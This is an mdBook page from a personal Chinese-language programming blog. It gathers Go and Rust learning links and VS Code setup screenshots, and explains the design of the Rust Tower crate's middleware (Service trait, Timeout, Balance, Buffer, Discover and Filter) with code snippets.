<!DOCTYPE HTML>
<html lang="zh-CN" class="sidebar-visible no-js light">

<head>
    <!-- Book generated using mdBook -->
    <meta charset="UTF-8">
    <title>M4n5ter Blog</title>
    <meta name="robots" content="noindex" />
    <!-- Custom HTML head -->
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#ffffff" />

    <link rel="shortcut icon" href="favicon.png">
    <link rel="stylesheet" href="css/variables.css">
    <link rel="stylesheet" href="css/general.css">
    <link rel="stylesheet" href="css/chrome.css">
    <link rel="stylesheet" href="css/print.css" media="print">
    <!-- Fonts -->
    <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
    <link rel="stylesheet" href="fonts/fonts.css">
    <!-- Highlight.js Stylesheets -->
    <link rel="stylesheet" href="highlight.css">
    <link rel="stylesheet" href="tomorrow-night.css">
    <link rel="stylesheet" href="ayu-highlight.css">

    <!-- Custom theme stylesheets -->
    <link rel="stylesheet" href="theme/style3.css">
</head>

<body>
    <!-- Provide site root to javascript -->
    <script type="text/javascript">
        var path_to_root = "";
        var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
    </script>

    <!-- Work around some values being stored in localStorage wrapped in quotes -->
    <script type="text/javascript">
        try {
            var theme = localStorage.getItem('mdbook-theme');
            var sidebar = localStorage.getItem('mdbook-sidebar');
            if (theme.startsWith('"') && theme.endsWith('"')) {
                localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
            }
            if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
            }
        } catch (e) { }
    </script>

    <!-- Set the theme before any content is loaded, prevents flash -->
    <script type="text/javascript">
        var theme;
        try { theme = localStorage.getItem('mdbook-theme'); } catch (e) { }
        if (theme === null || theme === undefined) { theme = default_theme; }
        var html = document.querySelector('html');
        html.classList.remove('no-js')
        html.classList.remove('light')
        html.classList.add(theme);
        html.classList.add('js');
    </script>

    <!-- Hide / unhide sidebar before it is displayed -->
    <script type="text/javascript">
        var html = document.querySelector('html');
        var sidebar = 'hidden';
        if (document.body.clientWidth >= 1080) {
            try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch (e) { }
            sidebar = sidebar || 'visible';
        }
        html.classList.remove('sidebar-visible');
        html.classList.add("sidebar-" + sidebar);
    </script>

    <nav id="sidebar" class="sidebar" aria-label="Table of contents">
        <div class="sidebar-scrollbox">
            <ol class="chapter"><li class="chapter-item expanded "><a href="intro/intro.html"><strong aria-hidden="true">1.</strong> Intro</a></li><li class="chapter-item expanded "><a href="go/go.html"><strong aria-hidden="true">2.</strong> GO</a></li><li class="chapter-item expanded "><a href="rust/rust.html"><strong aria-hidden="true">3.</strong> RUST</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="rust/tower/rust_tower.html"><strong aria-hidden="true">3.1.</strong> Tower</a></li><li class="chapter-item "><a href="rust/mini-redis/mini-redis.html"><strong aria-hidden="true">3.2.</strong> mini-redis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="rust/mini-redis/hello_tokio.html"><strong aria-hidden="true">3.2.1.</strong> Hello Tokio</a></li><li class="chapter-item "><a href="rust/mini-redis/spawning.html"><strong aria-hidden="true">3.2.2.</strong> Spawning</a></li><li class="chapter-item "><a href="rust/mini-redis/shared_state.html"><strong aria-hidden="true">3.2.3.</strong> Shared state</a></li><li class="chapter-item "><a href="rust/mini-redis/channels.html"><strong aria-hidden="true">3.2.4.</strong> Channels</a></li><li class="chapter-item "><a href="rust/mini-redis/io.html"><strong aria-hidden="true">3.2.5.</strong> I/O</a></li><li class="chapter-item "><a href="rust/mini-redis/framing.html"><strong aria-hidden="true">3.2.6.</strong> Framing</a></li><li class="chapter-item "><a href="rust/mini-redis/async_in_depth.html"><strong aria-hidden="true">3.2.7.</strong> Async in depth</a></li><li class="chapter-item "><a href="rust/mini-redis/select.html"><strong aria-hidden="true">3.2.8.</strong> Select</a></li><li class="chapter-item "><a href="rust/mini-redis/streams.html"><strong aria-hidden="true">3.2.9.</strong> Streams</a></li></ol></li><li class="chapter-item "><a href="rust/tokio/tokio.html"><strong aria-hidden="true">3.3.</strong> Tokio</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="rust/tokio/topics.html"><strong aria-hidden="true">3.3.1.</strong> Topics TODO</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="rust/tokio/bridging_with_sync_code.html"><strong aria-hidden="true">3.3.1.1.</strong> Bridging with sync code TODO</a></li><li class="chapter-item "><a href="rust/tokio/graceful_shutdown.html"><strong aria-hidden="true">3.3.1.2.</strong> Graceful Shutdown TODO</a></li><li class="chapter-item "><a href="rust/tokio/getting_started_with_tracing.html"><strong aria-hidden="true">3.3.1.3.</strong> Getting started with Tracing TODO</a></li><li class="chapter-item "><a href="rust/tokio/next_steps_with_tracing.html"><strong aria-hidden="true">3.3.1.4.</strong> Next steps with Tracing TODO</a></li></ol></li></ol></li></ol></li><li class="chapter-item expanded "><a href="other-categories/other-categories.html"><strong aria-hidden="true">4.</strong> Other categories</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="other-categories/archlinux/archlinux.html"><strong aria-hidden="true">4.1.</strong> archlinux</a></li><li class="chapter-item "><a href="other-categories/nc/nc.html"><strong aria-hidden="true">4.2.</strong> nmap-netcat(nc)</a></li><li class="chapter-item "><a href="other-categories/mkcert/mkcert.html"><strong aria-hidden="true">4.3.</strong> mkcert</a></li><li class="chapter-item "><a href="other-categories/aria2/aria2.html"><strong aria-hidden="true">4.4.</strong> aria2</a></li><li class="chapter-item "><a href="other-categories/postgres/postgres.html"><strong aria-hidden="true">4.5.</strong> postgres</a></li><li class="chapter-item "><a href="other-categories/pre-commit/pre-commit.html"><strong aria-hidden="true">4.6.</strong> pre-commit</a></li><li class="chapter-item "><a href="other-categories/minio/minio.html"><strong aria-hidden="true">4.7.</strong> minio</a></li><li class="chapter-item "><a href="other-categories/git/git.html"><strong aria-hidden="true">4.8.</strong> git</a></li><li class="chapter-item "><a href="other-categories/croc/croc.html"><strong aria-hidden="true">4.9.</strong> croc</a></li></ol></li><li class="chapter-item expanded "><a href="blockchain/blockchain.html"><strong aria-hidden="true">5.</strong> Blockchain</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="blockchain/substrate/substrate.html"><strong aria-hidden="true">5.1.</strong> substrate TODO</a></li></ol></li><li class="chapter-item expanded "><a href="issues/issues.html"><strong aria-hidden="true">6.</strong> issues and solutions</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="issues/docker/docker.html"><strong aria-hidden="true">6.1.</strong> docker</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="issues/docker/docker_issues.html"><strong aria-hidden="true">6.1.1.</strong> 问题及解决方案</a></li></ol></li><li class="chapter-item "><a href="issues/mysql/mysql.html"><strong aria-hidden="true">6.2.</strong> mysql</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="issues/mysql/mysql_issues.html"><strong aria-hidden="true">6.2.1.</strong> 问题及解决方案</a></li></ol></li><li class="chapter-item "><a href="issues/gitea/gitea.html"><strong aria-hidden="true">6.3.</strong> gitea</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="issues/gitea/gitea_issues.html"><strong aria-hidden="true">6.3.1.</strong> 问题及解决方案</a></li></ol></li><li class="chapter-item "><a href="issues/nginx/nginx.html"><strong aria-hidden="true">6.4.</strong> nginx</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="issues/nginx/nginx_issues.html"><strong aria-hidden="true">6.4.1.</strong> 问题及解决方案</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="links/links.html"><strong aria-hidden="true">7.</strong> Links</a></li></ol>
        </div>
        <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
    </nav>

    <div id="page-wrapper" class="page-wrapper">

        <div class="page">
            <div id="menu-bar-hover-placeholder"></div>
            <div id="menu-bar" class="menu-bar sticky bordered">
                <div class="left-buttons">
                    <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents"
                        aria-label="Toggle Table of Contents" aria-controls="sidebar">
                        <i class="fa fa-bars"></i>
                    </button>
                    <button id="theme-toggle" class="icon-button" type="button" title="Change theme"
                        aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                        <i class="fa fa-paint-brush"></i>
                    </button>
                    <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                        <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                        <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                        <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                        <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                        <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button>
                        </li>
                    </ul>
                    <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)"
                        aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S"
                        aria-controls="searchbar">
                        <i class="fa fa-search"></i>
                    </button>
                </div>

                <h1 class="menu-title">M4n5ter Blog</h1>

                <div class="right-buttons">
                    <a href="print.html" title="Print this book" aria-label="Print this book">
                        <i id="print-button" class="fa fa-print"></i>
                    </a>
                    <a href="https://github.com/m4n5ter/m4n5ter.github.io" title="Git repository" aria-label="Git repository">
                        <i id="git-repository-button" class="fa fa-github"></i>
                    </a>
                </div>
            </div>

            <div id="search-wrapper" class="hidden">
                <form id="searchbar-outer" class="searchbar-outer">
                    <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..."
                        aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                </form>
                <div id="searchresults-outer" class="searchresults-outer hidden">
                    <div id="searchresults-header" class="searchresults-header"></div>
                    <ul id="searchresults">
                    </ul>
                </div>
            </div>
            <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
            <script type="text/javascript">
                document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');

                // Get viewed page store
                var viewed_key = 'mdbook-viewed';
                var viewed_map = {};
                try {
                    var viewed_storage = localStorage.getItem(viewed_key);
                    if (viewed_storage) {
                        viewed_map = JSON.parse(viewed_storage)
                    }
                } catch (e) { }

                Array.from(document.querySelectorAll('#sidebar a')).forEach(function (link) {
                    link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);

                    // Apply viewed style
                    if (viewed_map[link.pathname]) {
                        link.classList.add('md-viewed')
                    }
                });

                // Mark viewed after 30s
                setTimeout(function () {
                    viewed_map[location.pathname] = 1;
                    localStorage.setItem(viewed_key, JSON.stringify(viewed_map));
                }, 30000)
            </script>

            <div id="content" class="content">
                <!-- Page table of contents -->
                <div class="sidetoc">
                    <nav class="pagetoc"></nav>
                </div>
                <main>
                    <h1 id="intro"><a class="header" href="#intro">Intro</a></h1>
<blockquote>
<p>我是 <a href="https://github.com/m4n5ter">M4n5ter</a> ，将在这里记录我的学习过程 ：)</p>
<p><em>参照 rust course 而建</em></p>
</blockquote>
<img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/smile2.png?raw=true">
<div style="break-before: page; page-break-before: always;"></div><h2 id="我的-go-从这开始"><a class="header" href="#我的-go-从这开始">我的 GO 从这开始</a></h2>
<h3 id="the-way-to-go"><a class="header" href="#the-way-to-go">the way to go</a></h3>
<p><a href="https://github.com/unknwon/the-way-to-go_ZH_CN">GitHub - unknwon/the-way-to-go_ZH_CN: 《The Way to Go》中文译本，中文正式名《Go 入门指南》</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="我的-rust-从这开始"><a class="header" href="#我的-rust-从这开始">我的 rust 从这开始</a></h2>
<h3 id="rust-官方-the-book-的译本"><a class="header" href="#rust-官方-the-book-的译本">rust 官方 the book 的译本</a></h3>
<p><a href="https://github.com/KaiserY/trpl-zh-cn">the book</a></p>
<h3 id="rust-cn-社区圣经"><a class="header" href="#rust-cn-社区圣经">rust cn 社区圣经</a></h3>
<p><a href="https://course.rs">rust course</a></p>
<h3 id="我的-rustlings-521-版本解决方案"><a class="header" href="#我的-rustlings-521-版本解决方案">我的 rustlings 5.2.1 版本解决方案</a></h3>
<p><a href="https://github.com/M4n5ter/rustlings-solutions">rustlings 5.2.1 解决方案</a></p>
<h2 id="我的-rust-相关-vscode-拓展以及配置"><a class="header" href="#我的-rust-相关-vscode-拓展以及配置">我的 rust 相关 vscode 拓展以及配置</a></h2>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/rust_extention1.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/rust_extention2.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/rust_extention3.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/rust_extention4.png?raw=true" alt="" /></p>
<p>以及一些设置:</p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/settings_1.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/settings_2.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/settings_3.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/settings_4.png?raw=true" alt="" /></p>
<p><img src="https://github.com/m4n5ter/m4n5ter.github.io/blob/main/assets/settings_5.png?raw=true" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="简介"><a class="header" href="#简介">简介</a></h3>
<p>Tower 是一个专注于对网络编程进行抽象的框架，将网络编程中的各行为进行抽象从而提高代码复用率。</p>
<p>Tower 最核心的抽象为 Service trait，其接受一个 request 进行处理，成功则返回 response，否则返回 error。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>async fn(Request) -&gt; Result&lt;Response, Error&gt;
<span class="boring">}
</span></code></pre></pre>
<p>这个抽象可以同时运用于客户端和服务端。同时 Tower 也提供了 超时处理、访问频率限制和负载均衡之类的组件，这些功能可以被抽象为在 inner Service 调用之前和之后进行一些操作所共同组成的Service。这些 Service 称为中间件(middleware)。</p>
<p>Tower 库对 Service 的设计希望满足以下目标：</p>
<ol>
<li>能够满足异步编程的规范</li>
<li>不同的 Service 能够灵活地层层嵌套</li>
<li>我们在给一个 Service 递交 request 时，希望能够得到该 Service 的执行情况；如果该 Service 负载过重，则需要延缓提交 request 甚至直接丢弃 request，这一点类似于 Future 中的 poll 方法。</li>
</ol>
<p>针对第一点，当 call 一个 Service 时，会直接返回一个 Future，由调用者决定怎么安排这个 Future，而不是要求实现了 Service trait 的结构体同时也实现 Future。</p>
<p>针对第二点，每个实现了 Service 的结构体自身可以继续携带一个 Service，只需要将 request 递交给里层的 Service，就实现了 Service 的嵌套，这样本结构体就成为了一个中间件。</p>
<p>针对第三点，在 Service 中定义了 <code>poll_ready</code> 方法用于获取一个 Service 的执行情况。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Service&lt;Request&gt; {
  type Response;
  type Error;
  type Future: Future&lt;Output = Result&lt;Self::Response, Self::Error&gt;&gt;;

  fn poll_ready(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result(), Self::Error&gt;&gt;;

  fn call(&amp;mut self, req: Request) -&gt; Self::Future;
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="通过-service-trait-实现-timeout-中间件"><a class="header" href="#通过-service-trait-实现-timeout-中间件"><strong>通过 Service trait 实现 Timeout 中间件</strong></a></h3>
<p>Timout 中间件用于对某个 request 的处理限定时间，如果超过时限还没有返回，则直接返回错误。Timout 应该有个用于进一步处理的里层serivce和一个时限。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Timeout&lt;T&gt; {
  service: T,
  duration: std::time::Duration
}
<span class="boring">}
</span></code></pre></pre>
<p>将 Timeout 也定义为一个 Service</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;S, Request&gt; Service&lt;Request&gt; for Timeout&lt;S&gt; 
where
  S: Service&lt;R&gt;,
  S::Error: Into&lt;Box&lt;dyn std::error::Error + Send + Sync&gt;&gt; 
<span class="boring">}
</span></code></pre></pre>
<p><code>poll_ready</code> 非常好处理，直接将调用里层 Service 的 poll_ready 函数。</p>
<p>而 <code>call</code> 则要求返回一个 Future，如果要实现 Timeout 对应的行为逻辑，需要创建一个新的实现了 Future 的类型——ResponseFuture。我们希望它被poll时，首先会查看里层 Service 是否返回，如果已返回则返回结果，如果没有则检查是否已经timeout，如果没有则返回 Pending，如果已经超时则返回超时错误。</p>
<p>因此我们创建了一个融合了里层 future 和超时 future 的类型</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[pin_project]
struct ResponseFuture&lt;F&gt; {
  #[pin]
  response_future: F,
  #[pin]
  sleep: tokio::time::Sleep
}
<span class="boring">}
</span></code></pre></pre>
<p>pin_project 可以使得 Pin 类型的字段也是 Pin 类型，在调用 poll 函数时需要用到。</p>
<p>然后为 ResponseFuture 实现 Future trait</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;F, Response, Error&gt; Future for ResponseFuture&lt;F&gt; 
where
    F: Future&lt;Output = Result&lt;Response, Error&gt;&gt;,
    Error: Into&lt;Box&lt;dyn std::error::Error + Send + Sync&gt;&gt;
{
    type Output = Result&lt;Response, Box&lt;dyn std::error::Error + Sync + Send&gt;&gt;;
    fn poll(self: std::pin::Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Self::Output&gt; {
        let this = self.project();
​
        match this.response_future.poll(cx) {
            Poll::Ready(res) =&gt; {
                let result = res.map_err(Into::into);
                return Poll::Ready(result);
            },
            Poll::Pending =&gt; {}
        }
​
        match this.sleep.poll(cx) {
            Poll::Ready(_) =&gt; {
                let error = Box::new(TimeoutError(()));
                Poll::Ready(Err(error))
            },
            Poll::Pending =&gt; Poll::Pending
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="balance-中间件"><a class="header" href="#balance-中间件">Balance 中间件</a></h3>
<p>从名字就可以看出来，Balance 模块用于提供负载均衡的服务，负载均衡会根据所有服务的负载程度来决定处理 request 的服务。</p>
<p>在官方文档提供了两种 Balance 服务</p>
<ul>
<li>p2c：根据p2c算法 (Power of Two Random Choices) 实现，提供一种简单而大概的 service 选择方法，一般在无法精确每个 service 的负载时使用。</li>
<li>pool：实现了一个动态大小的服务池 (service pool)，通过追踪每个 service 的 <code>poll_ready</code> 成功的次数来估计每个 service 的负载状况。（虽然这个模块还存在于官方文档之上，但是已经从最近的源码上移除了，显然官方打算移除这个模块，参见<a href="https://github.com/tower-rs/tower/pull/658">#658</a>。</li>
</ul>
<p>这里选择p2c算法进行分析。p2c 并非是一种挑选最优的算法，而是一种避免选到最坏的算法。其随机从所有 service 中选取两个，比较两个 service 的负载，选择较小的那个 service，从而保证避免选到负载最重的 service。这个算法在 nginx 中就有所运用。</p>
<p>Balance 内部通过 ready_cache 模块维护一个 Pending 队列和一个 Ready map，当 Service 陷入 Pending 状态时，则加入 Pending 队列中，新加入的 Service 一开始也是加入到 Pending 队列中。可以通过调用 <code>promote_pending_to_ready</code> 函数遍历所有的 Pending Service 将已经 Ready 的 Service 加入到 Ready map 中。</p>
<p>同样，Balance 也实现了 Service trait：</p>
<ul>
<li><code>poll_ready</code>：只有有存在一个被选中的 Service 是ready的，那么就可以返回 ready，并记录该 Service 的 index</li>
<li><code>call</code>：直接调用上面的 index 对应的 Service 处理 request，这也就是为什么 Tower 建议在调用某个 Service 之前一定要调用 <code>poll_ready</code> 询问服务是否空闲。对应的 Service 在被调用之后会被插入到 Pending 队列中。</li>
</ul>
<p>综上所述，Balance 模块提供了一种 Service 集托管服务，通过将 Service 集托管到 Balance 模块，由 Balance 决定 request 交给哪个 Service 处理。</p>
<h3 id="buffer-中间件"><a class="header" href="#buffer-中间件">Buffer 中间件</a></h3>
<p>Buffer 中间件希望提供一个类似于 mpsc 一样多生产者单消费者一样的缓存队列，可以允许多个用户同时像某个 Service 提交 request，更重要的是，Service 要能够将 request 的执行结果返回给用户。</p>
<p>Buffer 中间件的做法是将 Service 看作一个生产者，另外定义一个 Worker 作为消费者，Worker 负责接收 request 并处理。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Worker&lt;T, Request&gt;
where T: Service&lt;Request&gt; 
{
  current_message: Option&lt;Message&lt;Request, T::Future&gt;&gt;,
  rx: mpsc::Receiver&lt;Message&lt;Request, T::Future&gt;&gt;,
  service: T,
  finish: bool,
  failed: Option&lt;ServiceError&gt;,
  handle: Handle
}
<span class="boring">}
</span></code></pre></pre>
<p>Worker 维护了一个 mpsc channel 的接收端rx，而每个 Buffer Service 维护了一个 mpsc channel 的发送端tx，且 Buffer 实现了 Clone trait，当 Buffer 被 clone 时，对应的 tx 也被clone。</p>
<p>由于用户的 request 是由 Buffer 转交给 Worker 的，因此 request 的处理结果无法直接从 Buffer 获取。这里就体现了 Service trait 的灵活性，由于 Service 的call函数返回的是一个 Future，因此可以自定义一个 ResponseFuture，然后在 Worker 要处理的 Message 中包含一个 channel 的发送端，在call函数返回的 Future 中包含该 channel 的接收端，就可以使得 Worker 和用户之间可以直接通信。这个设计应该说是非常巧妙的。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;Req, Rsp, F, E&gt; Service&lt;Req&gt; for Buffer&lt;Req, F&gt;
where
  F: Future&lt;Output = Result&lt;Rsp, E&gt;&gt; + Send + 'static,
  E: Into&lt;Box&lt;dyn std::error::Error + Send + Sync&gt;&gt;,
  Req: Send + 'static
{
  type Response = Rsp;
  type Error = Box&lt;dyn std::error::Error + Send + Sync&gt;;
  type Future = ResponseFuture&lt;F&gt;;

  fn call(&amp;mut self, request: Rsp) -&gt; Self::Future {
    let span = tracing::Span::current();//这个不用管
    let (tx, rx) = oneshot::channel();//构建一次性管道用于传输返回结果。
    match self.tx.send_item(Message {request, span, tx}) {
      Ok(_) =&gt; ResponseFuture::new(rx),
      Err(_) =&gt; {}
    }
  }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="discover-中间件"><a class="header" href="#discover-中间件">Discover 中间件</a></h3>
<p>在前面的 Balance 中间件中提到了 Service 集的概念，有集合，就意味着有集合内元素的变动。各个中间件对于 Service 集合的实现可能并不相同，但是都对外提供了统一的增删接口，这个接口就是 Discover trait。</p>
<p>Discover 为了方便对 Service 集进行管理，要求用户对每个 Service 定义一个唯一的标识符并且实现了 Eq。</p>
<p>对 Service 集的修改主要就是增加和删除，用枚举 Change 表示：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum Change&lt;K, V&gt; {
  Insert(K, V),
  Remove(K)
}
<span class="boring">}
</span></code></pre></pre>
<p>对于一个维护 Service 集的struct，其对 Service 集的修改选择交给用户，由用户提供一个实现 Discover trait 的 struct，而维护 Service 集的 struct 只需要调用 poll_discover 函数就可以获取外界对 Service 集的修改。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Discover: Sealed&lt;Change&lt;(), ()&gt;&gt; {
  type Key: Eq,
  type Service;
  type Error;
  fn poll_discover(
    self: Pin&lt;&amp;mut self&gt;, 
    cx: &amp;mut Context&lt;'_&gt;
  ) -&gt; Poll&lt;Option&lt;Result&lt;Change&lt;Self::Key, Self::Service&gt;, Self::Error&gt;&gt;&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<blockquote>
<p><em>Tips: 在Rust异步编程中，很多的poll及类似的函数的返回结果都是 Poll&lt;Option&lt;Result&lt;V, E&gt;&gt;&gt; 类型的。这种返回类型可以从结果上反映很多东西，通常用于需要被多次poll的函数。</em></p>
</blockquote>
<ul>
<li><em>Poll::Pending: 暂时没有value返回，和普通的poll函数类似</em></li>
<li><em>Poll::Ready(None): 当前Future结束，不会再yield任何值</em></li>
<li><em>Poll::Ready(Some(Ok(_))): 当前 Future yield 一个值，可能还需要被poll</em></li>
<li><em>Poll::Ready(Some(Err(_))): 当前 Future 产生错误，需要进行处理</em></li>
</ul>
<p><em>这一套规则在很多 Rust 异步编程代码中都有体现，可以看作 Rust 异步编程中的潜规则。</em></p>
<p>值得注意的是，这里的 Sealed 是一个空 trait，并且在crate之外无法访问，但是在 discover 模块中为所有实现了 TryStream 的类型实现了 Sealed</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;K, S, E, D: ?Sized&gt; Sealed&lt;Change&lt;(), ()&gt;&gt; for D
where
    D: TryStream&lt;Ok = Change&lt;K, S&gt;, Error = E&gt;,
    K: Eq,
{}
<span class="boring">}
</span></code></pre></pre>
<p>也就是说，要实现 Discover 首先要实现 TryStream，而在 discover 中也为所有实现了 TryStream 的类型自动实现了 Discover trait:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;K, S, E, D: ?Sized&gt; Discover for D
where
    D: TryStream&lt;Ok = Change&lt;K, S&gt;, Error = E&gt;,
    K: Eq,
{
    type Key = K;
    type Service = S;
    type Error = E;
​
    fn poll_discover(
        self: Pin&lt;&amp;mut Self&gt;,
        cx: &amp;mut Context&lt;'_&gt;,
    ) -&gt; Poll&lt;Option&lt;Result&lt;D::Ok, D::Error&gt;&gt;&gt; {
        TryStream::try_poll_next(self, cx)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>也就是将 Discover 抽象为流式操作，这样就可以用到很多现成的实现了 Stream 的工具来存储对于 Service 集的修改。</p>
<h3 id="filter-中间件"><a class="header" href="#filter-中间件">Filter 中间件</a></h3>
<p>Filter 顾名思义，对于 request 进行一次筛选，只有符合筛选条件的 request 才会提交给 Service 处理。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Filter&lt;T, U&gt; {
  inner: T,
  predicate: U
}
<span class="boring">}
</span></code></pre></pre>
<p>可以看出，Filter 的初始定义非常自由，Filter 对 predicate 并没有任何限制，但是 Filter 必须要根据 predicate 的返回结果分别处理，所以 Filter 和 predicate 总是相关的。</p>
<p>Filter 只对于当 predicate 实现了 Predicate trait 时实现了 Service trait。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Predicate&lt;Req&gt; {
  type Request;
  fn check(&amp;mut self, request: Request) -&gt; Result&lt;Self::Request, Box&lt;dyn std::error::Error + Send + Sync&gt;&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<p>实现过程也很有意思，由于call函数要求返回一个 Future，因此当筛选不通过时，需要返回一个立刻返回 Ready(Err(_)) 的 Future</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;T, U, Request&gt; Service&lt;Request&gt; for Filter&lt;T, U&gt;
where
    U: Predicate&lt;Request&gt;,
    T: Service&lt;U::Request&gt;,
    T::Error: Into&lt;BoxError&gt;,
{
    type Response = T::Response;
    type Error = BoxError;
    type Future = ResponseFuture&lt;T::Response, T::Future&gt;;//即future_util::future::Either;
​
    fn poll_ready(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;Result&lt;(), Self::Error&gt;&gt; {
        self.inner.poll_ready(cx).map_err(Into::into)
    }
​
    fn call(&amp;mut self, request: Request) -&gt; Self::Future {
        ResponseFuture::new(match self.predicate.check(request) {
            Ok(request) =&gt; Either::Right(self.inner.call(request).err_into()),
            Err(e) =&gt; Either::Left(futures_util::future::ready(Err(e))),
        })
    }
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="async-predicate"><a class="header" href="#async-predicate"><strong>async predicate</strong></a></h3>
<p>上面讲的predicate函数并不是异步的，这只适用于一些快速筛选的 Filter，如果 predicate 过程也需要等待IO等适合做成异步的场景，那么应该将 predicate 过程也做成异步形式。因此 Filter 模块还存在一个适用于异步场景的 AsyncFilter。</p>
<p>这就导致在一个 Service 同时存在两种 Future，用户也不知道两种 Future 的先后关系，因此需要将两种 Future 放到一个 AsyncResponseFuture，由 AsyncResponseFuture 协调两个 Future。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum State&lt;F, G&gt; {
  Check {check: F},
  WaitResponse {response: G}
}
struct AsyncResponseFuture&lt;P, S, Request&gt;
where
  P: AsyncPredicate&lt;Request&gt;,
  S: Service&lt;P::Request&gt;
{
  state: State&lt;P::Future, S::Future&gt;,
  service: S
}
<span class="boring">}
</span></code></pre></pre>
